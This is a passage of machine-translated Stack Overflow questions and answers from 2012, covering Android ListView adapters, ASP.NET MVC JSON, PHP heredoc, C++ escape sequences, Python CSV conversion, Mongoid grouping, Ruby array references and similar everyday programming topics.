    mainListView = (ListView)findViewById(R.id.transactionListView);
    this.populateListView();
} 
```

您可以看到调用：

```
private void populateListView()
{
    populateListViewTask task = new populateListViewTask();
    task.execute();
} 
```

最后，AsyncTask onPostExecute()：

```
protected void onPostExecute(Void result)
{
    lvAdapter = new CustomArrayAdapter(MainActivity.this, R.layout.listitem, data);
    mainListView.setAdapter(lvAdapter);
} 
```

当然，实际的实现要复杂一些，但我已经消除了任何其他错误来源，除了在上述配置中没有调用 getView()。如果在 onPostExecute() 中添加 lvAdapter.getCount()，我得到 30（这是我所期望的，因为真实代码的 HTTP/XML 解析部分工作正常）。我也尝试添加 notifyDataSetChanged()，只是为了笑，但 CustomArrayAdapter 顾名思义，就是扩展 ArrayAdapter。我也在视图上尝试了 invalidate() ，也没有效果。

但是，如果在调用 AsyncTask 之前将 onCreate() 更改为具有单个虚拟列表项，如下所示：

```
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    mainListView = (ListView)findViewById(R.id.transactionListView);

    //Add dummy list item
    TestDataStructure[] data = new TestDataStructure[1];|
    data[0] = new TestDataStructure();
    data[0].item = "Dummy List Item";
    lvAdapter = new CustomArrayAdapter(MainActivity.this, R.layout.listitem, data);
    mainListView.setAdapter(lvAdapter);

    this.populateListView();
} 
```

getView() 将在 onPostExecute() 调用之后正确调用，ListView 将使用来自 AsyncTask 的新项目正确填充。我的预感是，在原来的情况下，Android 在 Activity 创建周期中确定了布局中项目的结构和可见性，并决定 transactionListView 因为它是空的而不可见，从而阻止它在新适配器时调用 getView()已设置。

关于如何在不添加虚拟列表项的情况下解决此问题的任何想法（在 AsyncTask 完成之前当然可见）？我的活动扩展了 Activity，而不是 ListActivity。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:41:08.293

如果您的数据是`ArrayList<String>`，您可以在`onCreate()`this中`data = new ArrayList<String>();`分配并使用此分配适配器，这将使您的 ListView 保持为空，直到您完成异步任务，您可以使用您的值分配数据，并通知适配器数据已更改为 this `adapter.notifyDataSetChanged()`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:30:27.823

听起来和看起来您需要在填充适配器后在适配器上调用 notifyDataSetChanged() 。这必须从 UI 线程调用，所以将其放入从 postExecute() 方法直接调用的代码中。

如果这有帮助，请将其标记为答案。

# asp.net-mvc - 将查询结果添加到 asp.net mvc 中的 Model 列表中

> ID：10220390
> 
> 赞同：1
> 
> 时间：2012-04-19T01:21:48.757
> 
> 标签：asp.net-mvc

我在我的 ASP.net MVC 项目中创建了一个模型：

```
public class ProductListingModels:ItemEntityDataContext
{
  public int ID { get; set; }
  public string Name { get; set; }
  public int DepartmentID { get; set; }
  public int BrandID { get; set; }
 } 
```

我有一个控制器：

```
public class ProductListingController : Controller
{
   // GET: /ProductListing/
   public JsonResult Index(string depID)
   {
   Context DataContext = new Context();
   JsonResult jr = new JsonResult();
   int dep = Convert.ToInt32(depID);
   var ien_item =   from i in DataContext.DataContext.Items
        join c in DataContext.DataContext.Categories on i.CategoryID equals c.ID
        join d in DataContext.DataContext.Departments on i.DepartmentID equals d.ID
        join brand in DataContext.DataContext.Brands on i.BrandID equals brand.ID
        orderby i.LastUpdated descending
        where i.DepartmentID == dep && i.Active > 0 && i.WebsiteShow > 0 && c.Active > 0 

                    select i;

     List<ProductListingModels> prom = new List<ProductListingModels>();
     //
     //Adding ien_item to the prom
     //
     jr.Data = prom;
         jr.JsonRequestBehavior = JsonRequestBehavior.AllowGet;
         return jr;
   }
}
public class Context : ICEWeb.Models.ItemEntityDataContext
{

} 
```

我想将我通过 linq (ien_item) 从数据库查询的每个数据添加到 ProductListingModel(prom object) 的对象中，然后将其作为 json 返回到我的视图中。

谁能给我一些想法。

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:28:50.713

首先，您的模型不应该从数据上下文继承。将整个上下文传递给视图严重违反了 MVC 基础的关注点分离。其次，您应该简单地选择视图类型的元素，然后在结果上调用 ToList()。

```
var model = (from i in DataContext.DataContext.Items
             join c in DataContext.DataContext.Categories on i.CategoryID equals c.ID
             join d in DataContext.DataContext.Departments on i.DepartmentID equals d.ID
             join brand in DataContext.DataContext.Brands on i.BrandID equals brand.ID
             orderby i.LastUpdated descending
             where i.DepartmentID == dep && i.Active > 0 && i.WebsiteShow > 0 && c.Active > 0 
             select new ProductListingModels
             {
                 ID = i.ID,
                 Name = i.Name,
                 ...
             }).ToList(); 
```

然后只需使用 Json() 便捷方法返回数据，而不是构建您自己的响应。

```
 return Json( model, JsonRequestBehavior.AllowGet ); 
```

# php - 用 PHP var 放置 JS

> ID：10220395
> 
> 赞同：0
> 
> 时间：2012-04-19T01:22:21.410
> 
> 标签：php, javascript

我的 PHP 文档末尾的页脚中有一个变量。但是，因为它是模板，所以在每个页面中创建的变量内容不同。该变量的大部分内容是 JS，看起来像这样：

```
 $myVar = '
    $(function() {
    '.$qTip.'

    $(".delDupe").click(function(){
        $(this).parent().find("input").val("");
        $(this).remove();
    });

    function custAxis() {
        if ($("#axisChk").is(":checked")){
            $(".customAxis").show();
        } else {
            $(".customAxis").hide();
        }
    }

    custAxis();
 }); 
```

这只是所有 JS 的一小部分。我想包含这个 JS，仍然将它作为 PHP 变量的一部分，但在 PHP 之外。可能吗？

```
$myVar = '?>
      // my JS
<? '; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:30:28.517

你可以使用这种格式：

```
$myVar = <<<EOD
Example of string
spanning multiple lines
using heredoc syntax.
EOD; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:31:51.473

您可以使用heredoc：

```
<?
$myVar = <<<END
$(function() {
....    
END;

echo $myVar;
?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T01:39:02.007

你可以使用heredoc

```
<?php 
$myVar = <<<EOD
   $(".delDupe").click(function(){
        $(this).parent().find("input").val("");
        $(this).remove();
    });

    $qTip

    function custAxis() {
        if ($("#axisChk").is(":checked")){
            $(".customAxis").show();
        } else {
            $(".customAxis").hide();
        }
    }
EOD;
?> 
```

或者您可以使用 ob_start 并跳出 PHP 并将输出作为变量获取，这就是我加载所有视图/html 的方式

```
<?php
ob_start();
?>
  $(".delDupe").click(function(){
        $(this).parent().find("input").val("");
        $(this).remove();
    });

    <?=$qTip;?>

    function custAxis() {
        if ($("#axisChk").is(":checked")){
            $(".customAxis").show();
        } else {
            $(".customAxis").hide();
        }
    }
<?php
$myVar = ob_get_contents();
ob_end_clean();
echo $myVar;
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T01:35:21.633

将 JavaScript 放入 html 并从 php 输出 $qTip 字符串。它或多或少与您所做的效果相同，只是以另一种方式编写。

```
$(function() {
<?=$qTip?>

$(".delDupe").click(function(){
    $(this).parent().find("input").val("");
    $(this).remove();
});

function custAxis() {
    if ($("#axisChk").is(":checked")){
        $(".customAxis").show();
    } else {
        $(".customAxis").hide();
    }
}

custAxis();
}); 
```

# c++ - C++ 字符串文字转义字符的规则

> ID：10220401
> 
> 赞同：47
> 
> 时间：2012-04-19T01:23:17.097
> 
> 标签：c++, string, escaping

`\`字符串文字中转义字符的规则是什么？是否有所有转义字符的列表？

特别是，当我`\`在 gedit 中使用字符串文字并在其后跟任意三个数字时，它们的颜色会有所不同。

我试图创建一个`std::string`从文字构造的字符，`0`后跟空字符 ( `\0`)，后跟字符`0`。但是，语法突出显示提醒我，这可能会创建类似于`0`后跟空字符 ( `\00`, aka `\0`) 的字符，也就是说，只有两个字符。

为了解决这个问题，这是最好的方法：

```
std::string ("0\0" "0", 3)  // String concatenation 
```

对于转义字符在字符串文字中的作用，是否有一些参考？例如，'\a' 是什么？

* * *

## 回答 #1

> 赞同：82
> 
> 时间：2012-04-19T01:43:08.677

**控制字符：**

（十六进制代码假定与 ASCII 兼容的字符编码。）

*   `\a`= `\x07`= 警报（铃声）
*   `\b`= `\x08`= 退格
*   `\t`= `\x09`= 水平制表符
*   `\n`= `\x0A`= 换行（或换行）
*   `\v`= `\x0B`= 垂直制表符
*   `\f`= `\x0C`= 换页
*   `\r`= `\x0D`= 回车
*   `\e`= `\x1B`= 转义（非标准 GCC 扩展）

**标点符号：**

*   `\"`= 引号（不需要反斜杠`'"'`）
*   `\'`= 撇号（不需要反斜杠`"'"`）
*   `\?`= 问号（用于避免三连音）
*   `\\`= 反斜杠

**数字字符参考：**

*   `\`+ 最多 3 个八进制数字
*   `\x`+ 任意数量的十六进制数字
*   `\u`+ 4 个十六进制数字（Unicode BMP，C++11 中的新功能）
*   `\U`+ 8 个十六进制数字（Unicode 星体平面，C++11 中的新功能）

`\0`= `\00`= `\000`= 空字符的八进制转义符

如果您确实想要 a 之后的实际数字字符`\0`，那么是的，我建议使用字符串连接。请注意，文字部分之间的空格是可选的，因此您可以编写`"\0""0"`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-19T01:26:01.810

`\a`是铃声/警报字符，在某些系统上会触发声音。`\nnn`, 表示以八进制为基数的任意 ASCII 字符。但是，`\0`它的特殊之处在于它无论如何都表示空字符。

要回答您的原始问题，您也可以转义您的 '0' 字符，如：

```
std::string ("\060\000\060", 3); 
```

（因为 ASCII '0' 是八进制的 60）

[MSDN 文档](http://msdn.microsoft.com/en-us/library/h21280bw%28v=vs.80%29.aspx)对此有一篇非常详细的文章，以及[cppreference](http://en.cppreference.com/w/cpp/language/escape)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-19T01:29:05.170

如果 \0 后面跟着其他数字，则 \0 将被解释为八进制转义序列，因此 \00 将被解释为单个字符。（\0 在技术上也是八进制转义序列，至少在 C 中是这样）。

你这样做的方式：

```
std::string ("0\0" "0", 3)  // String concatenation 
```

之所以有效，是因为此版本的构造函数采用 char 数组；如果您尝试将“0\0”“0”作为 const char* 传递，它会将其视为 C 字符串，并且只会复制所有内容，直到出现空字符。

这是一个[转义序列列表](http://en.cppreference.com/w/cpp/language/escape)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-30T16:47:07.093

我留下了这样的评论作为评论，但我觉得它可能需要更多的可见性，因为没有一个答案提到这种方法：

我现在更喜欢`std::string`用非打印字符（特别是嵌入的空字符）初始化 a 的方法是使用初始化列表的 C++11 特性。

```
std::string const str({'\0', '6', '\a', 'H', '\t'}); 
```

我不需要对我正在使用的字符数进行容易出错的手动计数，这样如果以后我想在中间的某个地方插入一个 '\013'，我可以并且我的所有代码仍然可以工作. 它还完全避免了意外使用错误转义序列的任何问题。

唯一的缺点是所有这些额外的`'`字符`,`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-07-30T01:44:35.867

借助用户定义文字的魔力，我们有了另一种解决方案。C++14 添加了`std::string`文字运算符。

```
using namespace std::string_literals;
auto const x = "\0" "0"s; 
```

构造一个长度为 2 的字符串，其中包含一个 '\0' 字符（null），后跟一个 '0' 字符（数字零）。我不确定它是否比`initializer_list<char>` [构造方法](https://stackoverflow.com/a/13649452/852254)更清晰，但它至少摆脱了`'`and`,`字符。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-09-04T07:25:14.167

`ascii`是一个可以下载的Linux软件包。例如 `sudo apt-get install ascii` `ascii`

```
Usage: ascii [-dxohv] [-t] [char-alias...]
-t = one-line output  -d = Decimal table  -o = octal table  -x = hex table
-h = This help screen -v = version information
Prints all aliases of an ASCII character. Args may be chars, C \-escapes,
English names, ^-escapes, ASCII mnemonics, or numerics in decimal/octal/hex.` 
```

此代码可以帮助您使用 C/C++ 转义码，例如`\x0A`

# python - 使用 Python 将制表符分隔的 txt 文件转换为 csv 文件

> ID：10220412
> 
> 赞同：23
> 
> 时间：2012-04-19T01:24:34.417
> 
> 标签：python, csv, text-files

所以我想将一个简单的制表符分隔的文本文件转换为 csv 文件。如果我使用 string.split('\n') 将 txt 文件转换为字符串，我会得到一个列表，其中每个列表项作为字符串，每列之间都有 '\t'。我在想我可以用逗号替换'\ t'，但它不会像字符串一样对待列表中的字符串并允许我使用string.replace。这是我的代码的开始，它仍然需要一种方法来解析选项卡“\t”。

```
import csv
import sys

txt_file = r"mytxt.txt"
csv_file = r"mycsv.csv"

in_txt = open(txt_file, "r")
out_csv = csv.writer(open(csv_file, 'wb'))

file_string = in_txt.read()

file_list = file_string.split('\n')

for row in ec_file_list:       
    out_csv.writerow(row) 
```

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-04-19T01:27:00.503

`csv`支持制表符分隔的文件。将[`delimiter`参数提供给`reader`](http://docs.python.org/library/csv.html#csv.reader)：

```
import csv

txt_file = r"mytxt.txt"
csv_file = r"mycsv.csv"

# use 'with' if the program isn't going to immediately terminate
# so you don't leave files open
# the 'b' is necessary on Windows
# it prevents \x1a, Ctrl-z, from ending the stream prematurely
# and also stops Python converting to / from different line terminators
# On other platforms, it has no effect
in_txt = csv.reader(open(txt_file, "rb"), delimiter = '\t')
out_csv = csv.writer(open(csv_file, 'wb'))

out_csv.writerows(in_txt) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T03:16:43.283

为什么在使用`csv`模块读取文件时应该始终使用 'rb' 模式：

```
Python 2.7.2 (default, Jun 12 2011, 15:08:59) [MSC v.1500 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information. 
```

示例文件中的内容：任何旧垃圾，包括通过从数据库中提取 blob 或任何内容获得的控制字符，或`CHAR`在 Excel 公式中不明智地使用该函数，或...

```
>>> open('demo.txt', 'rb').read()
'h1\t"h2a\nh2b"\th3\r\nx1\t"x2a\r\nx2b"\tx3\r\ny1\ty2a\x1ay2b\ty3\r\n' 
```

Python 在以文本模式读取文件时遵循 CP/M、MS-DOS 和 Windows：`\r\n`被识别为行分隔符并提供为`\n`，并且`\x1a`Ctrl-Z 被识别为 END-OF-FILE 标记。

```
>>> open('demo.txt', 'r').read()
'h1\t"h2a\nh2b"\th3\nx1\t"x2a\nx2b"\tx3\ny1\ty2a' # WHOOPS 
```

使用“rb”打开的文件的 csv 按预期工作：

```
>>> import csv
>>> list(csv.reader(open('demo.txt', 'rb'), delimiter='\t'))
[['h1', 'h2a\nh2b', 'h3'], ['x1', 'x2a\r\nx2b', 'x3'], ['y1', 'y2a\x1ay2b', 'y3']] 
```

但文本模式不会：

```
>>> list(csv.reader(open('demo.txt', 'r'), delimiter='\t'))
[['h1', 'h2a\nh2b', 'h3'], ['x1', 'x2a\nx2b', 'x3'], ['y1', 'y2a']]
>>> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-10-12T12:55:14.093

我就是这样做的

```
import csv

with open(txtfile, 'r') as infile, open(csvfile, 'w') as outfile:
     stripped = (line.strip() for line in infile)
     lines = (line.split(",") for line in stripped if line)
     writer = csv.writer(outfile)
     writer.writerows(lines) 
```

# outlook - 修改 Outlook 2010 的 MailItem 中的收件人上下文菜单？

> ID：10220420
> 
> 赞同：1
> 
> 时间：2012-04-19T01:25:18.280
> 
> 标签：outlook, vsto, outlook-addin, outlook-2010

如果您打开收到的电子邮件并右键单击发件人或收件人，则会出现一个上下文菜单，其中包含简短的按钮列表（剪切、复制、... 添加到 Outlook 联系人、查找 Outlook 联系人、联系人卡片）。我想将我自己的自定义按钮添加到此上下文菜单中。不幸的是，我找不到上下文菜单的控件标识符 (msoID)。我查看了已读邮件项的[控件标识符](http://www.microsoft.com/download/en/details.aspx?displaylang=en&id=6627)列表，但找不到任何类似于上下文菜单或其任何按钮的内容。此上下文菜单是否不可修改？我怀疑我找错地方了。任何帮助深表感谢。

控制标识符的完整（或可能不那么完整）列表可在此处找到：[Office 2010 帮助文件：Office Fluent 用户界面控件标识符](http://www.microsoft.com/download/en/details.aspx?displaylang=en&id=6627)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T21:24:38.287

我在这篇 MSDN 帖子中找到了它：[Customizing the Context Menu of a Contact Card in Outlook 2010](http://msdn.microsoft.com/en-us/library/ee909466.aspx)

msoID 的名称是`ContextMenuContactCardRecipient`. 您还将在联系人卡片本身的按钮上看到相同的上下文菜单。此辅助上下文菜单的 msoID 是`ContextMenuContactCardOverflowDropdown`。我完全不知道为什么 MS 没有将其包含在其控制标识符列表中。我仍在寻找这些上下文菜单上项目的控件 ID。

# persistence - 使用 Knockoutjs 在回发之间保持视图模型

> ID：10220422
> 
> 赞同：2
> 
> 时间：2012-04-19T01:25:38.333
> 
> 标签：persistence, postback, knockout.js, viewmodel, field

我有一个使用 Knockoutjs 连接到 javascript 视图模型的输入控件的表单。但是，单击提交按钮后，其中的所有值都将丢失。有没有办法通过使用隐藏字段在回发之间保留这些临时数据？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T18:32:12.990

Knockout 是一个很好的框架，没有数据持久性、URL 历史记录等功能。但是你有很多插件可以提供这些功能。查看

[https://github.com/jimrhoskins/knockout.localStorage](https://github.com/jimrhoskins/knockout.localStorage)

[https://github.com/katowulf/knockout-sync](https://github.com/katowulf/knockout-sync)

可以有更多。尝试一个适合您的应用程序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T02:52:24.640

如果您在回发时刷新页面，所有 js 状态都会丢失。除非您使用 cookie 或本地存储来存储状态并在下次加载时检索。隐藏的字段在回发时会被破坏，所以恐怕它们不会帮助你。

如果您使用 KO 将表单绑定到 viewModel，为什么不通过 ajax 提交它并且不要刷新页面。这确实是 KO 大放异彩的地方，它允许您构建响应速度更快的应用程序。

希望这可以帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-23T12:32:37.757

实际上，您可以将状态保存在隐藏字段中。看看这个[http://www.codeproject.com/Articles/153735/Using-KnockoutJS-in-your-ASP-NET-applications](http://www.codeproject.com/Articles/153735/Using-KnockoutJS-in-your-ASP-NET-applications)。

# html - 为什么要连续使用两页作为网站地址？

> ID：10220427
> 
> 赞同：1
> 
> 时间：2012-04-19T01:26:55.103
> 
> 标签：html, url, web

这只是一种好奇。我见过这几次：

```
http://www.website.com/index.php/en/contacts.html 
```

这种逻辑背后的原因是什么？为什么我们有 php 文件后跟 html 文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:30:02.270

无法确定，但我敢打赌“en/contacts.html”是要包含的 index.php 文件的路径（非常糟糕的做法）。不要使用这种 URL 语法，因为它们对用户和搜索引擎都不友好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:31:09.980

`index.php`有些人发现拥有一个包含（除其他外）连接到数据库、页面的基本布局（导航、页脚等）等内容的单个文件更容易，然后让它包含实际文件（在这种情况`/en/contacts.html`）里面。

就个人而言，我认为这是一个坏主意，因为有很多更好的方法可以做到这一点。其中之一是 中的`auto_prepend_file`and`auto_append_file`选项`php.ini`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T01:31:57.610

这很可能是使用包含一些路由机制的框架。index.php 将 /en/contacts.html 作为参数，检索适当的文件并根据预先确定的规则处理它们。

在大多数情况下，在 Apache 或 Nginx（或任何正在使用的网络服务器）中使用重写规则，因此 url 可以采用以下形式：

```
http://www.website.com/en/contacts.html 
```

然后根之后的所有内容都被解释为 index.php 中的参数。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T01:35:15.810

在 PHP（我相信其他服务器端语言）中，您可以`index.php`通过引用超全局来获取路径，`$_SERVER['path_info']`在这种情况下，值为

`/en/contacts.html`

，然后您可以在应用程序中处理您认为合适的路径（例如在 MVC 中`/users/list`，您将初始化`users`控制器并`list`对其运行操作）

# ruby-on-rails - 在 Mongoid 文档的范围内需要 group_by

> ID：10220429
> 
> 赞同：2
> 
> 时间：2012-04-19T01:27:02.180
> 
> 标签：ruby-on-rails, mongoid

我有一个这样的模型：

```
class Event
  include Mongoid::Document
  include Mongoid::Timestamps

  scope :range,  lambda {|start, finish| 
    where(:created_at => {'$gte' => start,'$lt' => finish}) if start && finish
  }
end 
```

我需要按事件发生日期分组的事件数量的哈希值：

```
{"2011-11-07"=>2, "2011-10-25"=>10, "2011-04-03"=>1, "2011-05-13"=>1, "2011-03-23"=>1, "2011-11-08"=>4, "2011-06-12"=>1, "2011-10-26"=>6} 
```

我可以使用这个相当笨重的链从控制台中得到准确的信息：

```
Event.range(4.months.ago, Time.now).to_a.
  group_by{ |e| e.created_at.to_date }.
  map{ |date, events| [date.to_s, events.count]}.
  inject({}) { |r, i| r[i.first] = i.last; r } 
```

我真的很想把它放到一个范围或类方法中，这样我就可以写：

```
Event.range(4.months.ago, Time.now).daily 
```

关于如何做到这一点的任何想法？

**更新**：

仅供参考，我已经尝试了以下每种解决方案。

```
scope :daily,  lambda { to_a.group_by{ |e| e.created_at.to_date }.
                        map{ |date, events| [date.to_s, events.count]}.
                        inject(ActiveSupport::OrderedHash.new) { |r, i| r[i.first] = i.last; r } } 
```

和

```
def self.daily
  to_a.group_by{ |e| e.created_at.to_date }.
    map{ |date, events| [date.to_s, events.count]}.
    inject(ActiveSupport::OrderedHash.new) { |r, i| r[i.first] = i.last; r }
end 
```

两者都失败了。回溯：

```
> Event.range(2.week.ago, Time.now).daily
/my_app/event.rb:37: warning: default `to_a' will be obsolete
NoMethodError: undefined method `created_at' for Event:Class
    from /my_app/event.rb:37:in `daily'
    from /var/bundler/turtle/ruby/1.8/gems/activesupport-3.0.7/lib/active_support/core_ext/enumerable.rb:26:in `group_by'
    from /var/bundler/turtle/ruby/1.8/gems/activesupport-3.0.7/lib/active_support/core_ext/enumerable.rb:25:in `each'
    from /var/bundler/turtle/ruby/1.8/gems/activesupport-3.0.7/lib/active_support/core_ext/enumerable.rb:25:in `group_by'
    from /my_app/event.rb:37:in `daily'
    from /var/bundler/turtle/ruby/1.8/gems/mongoid-2.2.0/lib/mongoid/criteria.rb:366:in `send'
    from /var/bundler/turtle/ruby/1.8/gems/mongoid-2.2.0/lib/mongoid/criteria.rb:366:in `method_missing'
    from /var/bundler/turtle/ruby/1.8/gems/mongoid-2.2.0/lib/mongoid/named_scope.rb:120:in `with_scope'
    from /var/bundler/turtle/ruby/1.8/gems/mongoid-2.2.0/lib/mongoid/criteria.rb:365:in `send'
    from /var/bundler/turtle/ruby/1.8/gems/mongoid-2.2.0/lib/mongoid/criteria.rb:365:in `method_missing'
    from (irb):57
    from :0 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T11:56:28.753

类方法将不起作用，因为`Event.range(4.months.ago, Time.now).daily`需要每天根据标准定义方法，并且范围将不起作用，因为范围需要返回一个标准。目前你最好的选择是每天创建一个类方法并像使用它一样使用它`Event.daily(start, finish)`

```
class Event
  include Mongoid::Document
  include Mongoid::Timestamps

  scope :range,  lambda {|start, finish| 
    where(:created_at => {'$gte' => start,'$lt' => finish}) if start && finish
  }

  def self.daily(start, finish)
    daily_events = {}
    self.range(start, finish).each do |event|
      date_str = event.created_at.to_date.to_s
      daily_events[date_str] ||= 0
      daily_events[date_str] += 1
    end
    return daily_events
  end
end 
```

# c# - 如何将访问数据库添加到我已发布的 C# 程序？

> ID：10220442
> 
> 赞同：0
> 
> 时间：2012-04-19T01:29:28.277
> 
> 标签：c#, ms-access

所以我用 C# 编写了一个程序并向其中添加了一个访问数据库（.accdb）。我可以在调试模式下轻松使用它，但是在我发布应用程序后，每次我尝试使用它都会给我一个错误（它说它找不到它）。

我的问题是我怎样才能使它也与程序一起安装 .accdb 文件？

在调试文件夹中，.accdb 文件与 .exe 位于同一文件夹中，因此我需要将其安装在与 .exe 相同的文件夹中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:39:25.313

您可以[在此处查看](https://stackoverflow.com/questions/2251062/c-sharp-how-to-make-an-installer-for-my-application)如何将安装向导添加到您的应用程序，然后您应该将 .accdb 文件添加到已安装的文件中。

您可能仍然需要检查文件是否存在，如果不存在 - 通知用户并退出，或者创建数据库的空白模板并且不使用任何数据。

# ajax - 使用来自底层输入流的数据进行异常填充缓冲区

> ID：10220443
> 
> 赞同：0
> 
> 时间：2012-04-19T01:29:28.843
> 
> 标签：ajax, jsp, tomcat, file-upload

当我使用 Apache Commons FileUpload 上传文件时，它会引发异常：

> org.apache.commons.fileupload.FileUploadException：使用来自底层输入流的数据填充缓冲区的异常：不是 EAGAIN 状态，所以可能是断开连接的客户端？

这是如何引起的，我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:50:35.493

基于[此线程](http://coding.derkeiler.com/Archive/Java/comp.lang.java.programmer/2007-07/msg02444.html)，tomcat-5.5.x 报告了 一个[错误](http://issues.apache.org/bugzilla/show_bug.cgi?id=40960)，该错误已在 6.x 中解决。

不是一个确凿的答案，但值得一试。

# clojure - Clojure，莱因，project.clj，莱因

> ID：10220451
> 
> 赞同：4
> 
> 时间：2012-04-19T01:30:51.837
> 
> 标签：clojure, leiningen

现在，当我运行 lein 时，它倾向于：

(1) 杀死 lib/* 然后 (2) 重新安装/下载各种库到 lib/

现在，这是一个问题，因为我倾向于将需要的 *.jars 复制到 lib/ 中，但随后 lein 将它们删除。

问题：有没有一种方法可以让我和 lein 理解 (1) lein 不会杀死 lib/* 中的内容或 (2) lein 知道另一个目录来搜索 *.jars

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T01:51:52.573

不要将它们添加到项目中，而是将它们添加到本地 maven 存储库 (~/.m2) 并将它们添加为依赖项。您可以通过在缺少它们的情况下运行lien deps 并阅读错误消息来获得添加它们的确切语法。它看起来像这样：

```
mvn install:install-file -Dfile=<path-to-file> -DgroupId=<group-id> \
  -DartifactId=<artifact-id> -Dversion=<version> -Dpackaging=<packaging> 
```

一般来说，您可能想查看这个[类似的 SO question](https://stackoverflow.com/questions/2404426/leiningen-how-to-add-dependencies-for-local-jars)

# ruby - 变量的基本问题

> ID：10220457
> 
> 赞同：1
> 
> 时间：2012-04-19T01:32:02.223
> 
> 标签：ruby

我觉得我错过了一些非常非常基本的东西，所以，为了避免扯掉更多的头发，我来这里问为什么 p1、p1t 和 p1t2 会被修改为“hand = newgame.view p1”。我什至不知道为什么 p1 会被修改，所以是的，我在这里完全感到困惑。任何帮助将不胜感激。

```
# encoding: utf-8

class Cards

def view hand
    x = 0
    hand.each do |card|
        if card[0] == 's'
            card[0] = '♠'
        elsif card[0] == 'd'
            card[0] = '♦'
        elsif card[0] == 'h'
            card[0] = '♥'
        elsif card[0] == 'c'
            card[0] = '♣'
        else
            #nil
        end
        hand[x] = card
        x = x + 1
    end
    prettyhand = ''
    hand.each do |card|
        prettyhand = prettyhand + card[0] + card[1] + ' '
    end
    return prettyhand
end#view

end#Cards
###########

deck = 0
up = 0
p1 = 0
p2 = 0
newgame = Cards.new
p1 = [["c", "4"], ["s", "4"], ["d", "q"], ["c", "8"], ["s", "5"], ["s", "q"], ["h", "3"], ["c", "10"]]
    p1t = []
    p1t2 = []
    hand = ''
    p1.each do |card|
        p1t.push card
    end
    p1t.each do |card|
        p1t2.push card
    end
    p '----------------------------------'
    p 'fresh p1:'
    p p1
    p p1t
    p p1t2
    hand = newgame.view p1
    p 'unfresh p1:'#why is this changing??
    p p1
    p p1t
    p p1t2
    p '----------------------------------' 
```

输出：

```
"----------------------------------"
"fresh p1:"
[["c", "4"], ["s", "4"], ["d", "q"], ["c", "8"], ["s", "5"], ["s", "q"], ["h", "3"], ["c", "10"]]
[["c", "4"], ["s", "4"], ["d", "q"], ["c", "8"], ["s", "5"], ["s", "q"], ["h", "3"], ["c", "10"]]
[["c", "4"], ["s", "4"], ["d", "q"], ["c", "8"], ["s", "5"], ["s", "q"], ["h", "3"], ["c", "10"]]
"unfresh p1:"
[["♣", "4"], ["♠", "4"], ["♦", "q"], ["♣", "8"], ["♠", "5"], ["♠", "q"], ["♥", "3"], ["♣", "10"]]
[["♣", "4"], ["♠", "4"], ["♦", "q"], ["♣", "8"], ["♠", "5"], ["♠", "q"], ["♥", "3"], ["♣", "10"]]
[["♣", "4"], ["♠", "4"], ["♦", "q"], ["♣", "8"], ["♠", "5"], ["♠", "q"], ["♥", "3"], ["♣", "10"]]
"----------------------------------" 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:35:32.630

您已经定义了一个`view`带有参数的方法`hand`（顺便说一句，parens 很好，不知道为什么您总是在代码中省略它们，即使在方法签名中也是如此）。该`view`方法修改其参数`hand`。你称之为

```
hand = newgame.view p1 
```

这个，`p1`由方法修改，`view`这就是它改变的原因。

我也很好奇你为什么设置`p1`为`0`... 然后将其设置为数组数组。没有理由这样做。此外，尝试为自己和他人使用描述性变量名称。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T01:35:41.240

数组通过引用传递，而不是复制。看看这个片段。

```
a1 = [[1], [2], [3]]
a2 = []

a2 << a1.first # push a reference to the array
a2 # => [[1]]

a1[0][0] += 1 # => 2
a1 # => [[2], [2], [3]] # a1 has changed
a2 # => [[2]] # a2 changed too!

# now push a copy of the array
a2 = [a1.first.dup] # => [[2]]

a1[0][0] += 1 # => 3
a1 # => [[3], [2], [3]] # a1 has changed
a2 # => [[2]] # a2 has not 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T01:58:10.447

FWIW，您的`view`方法可以简化很多：

```
class Cards
  Suits = { 'c' => '♣', 'd' => '♦', 'h' => '♥', 's' => '♠' }

 def view(hand)
    hand.map do |suit, rank| [ Suits[suit], rank ] end
 end
end 
```

这个版本没有修改任何东西，所以避免了这个问题。

# android - 将地址转换为纬度和经度，并在地图上显示结果，getNameFrom 没有给出任何内容

> ID：10220458
> 
> 赞同：0
> 
> 时间：2012-04-19T01:32:05.813
> 
> 标签：android, android-mapview

